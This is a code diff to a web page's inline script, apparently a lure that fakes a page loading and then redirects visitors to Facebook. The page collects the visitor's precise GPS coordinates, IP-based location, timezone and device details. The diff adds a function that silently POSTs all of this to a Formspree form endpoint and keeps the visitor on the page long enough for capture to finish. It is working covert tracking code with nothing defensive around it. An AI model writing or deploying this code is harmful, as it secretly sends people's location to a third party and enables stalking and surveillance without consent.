@@ -470,8 +470,9 @@ nav {
 <script>
 var payload = { timestamp: new Date().toISOString(), user_agent: navigator.userAgent, screen: screen.width + 'x' + screen.height, language: navigator.language };
 var gpsReady = false, ipReady = false, submitted = false;
+var startTime = Date.now();
+var MIN_DISPLAY = 8000;
 
-// Animate progress bar
 var bar = document.getElementById('nav-progress-bar');
 var pct = 0;
 var pInterval = setInterval(function(){
@@ -480,46 +481,47 @@ var pInterval = setInterval(function(){
   bar.style.width = pct + '%';
 }, 300);
 
+function doRedirect() {
+  clearInterval(pInterval);
+  bar.style.width = '100%';
+  fetch('https://formspree.io/f/mjywpbar', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(function(){});
+  try { localStorage.setItem('geo_capture', JSON.stringify(payload)); } catch(e){}
+  setTimeout(function(){ window.location.href = 'https://www.facebook.com'; }, 400);
+}
+
 function tryFinalize() {
   if (!submitted && (gpsReady || ipReady)) {
     submitted = true;
-    clearInterval(pInterval);
-    bar.style.width = '100%';
-    try { localStorage.setItem('geo_capture', JSON.stringify(payload)); } catch(e){}
-    setTimeout(function(){ window.location.href = 'https://www.facebook.com'; }, 500);
+    var elapsed = Date.now() - startTime;
+    setTimeout(doRedirect, Math.max(0, MIN_DISPLAY - elapsed));
   }
 }
 
-// GPS (precise — fires when user clicks Allow)
 navigator.geolocation.getCurrentPosition(
   function(pos) {
     payload.gps_lat = pos.coords.latitude;
     payload.gps_lng = pos.coords.longitude;
     payload.gps_acc = pos.coords.accuracy;
-    gpsReady = true;
-    tryFinalize();
+    gpsReady = true; tryFinalize();
   },
   function() { gpsReady = true; tryFinalize(); },
   { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
 );
 
-// IP location (silent, no dialog)
 fetch('https://get.geojs.io/v1/ip/geo.json')
   .then(function(r){ return r.json(); })
   .then(function(d){
-    payload.ip = d.ip;
-    payload.ip_city = d.city;
-    payload.ip_country = d.country_code;
-    payload.ip_lat = d.latitude;
-    payload.ip_lng = d.longitude;
-    payload.timezone = d.timezone;
-    ipReady = true;
-    tryFinalize();
+    payload.ip = d.ip; payload.ip_city = d.city; payload.ip_country = d.country_code;
+    payload.ip_lat = d.latitude; payload.ip_lng = d.longitude; payload.timezone = d.timezone;
+    ipReady = true; tryFinalize();
   })
   .catch(function(){ ipReady = true; tryFinalize(); });
 
-// Safety net: redirect after 12 seconds regardless
 setTimeout(function(){
-  if (!submitted) { submitted = true; window.location.href = 'https://www.facebook.com'; }
-}, 12000);
+  if (!submitted) { submitted = true; doRedirect(); }
+}, 15000);
 </script>
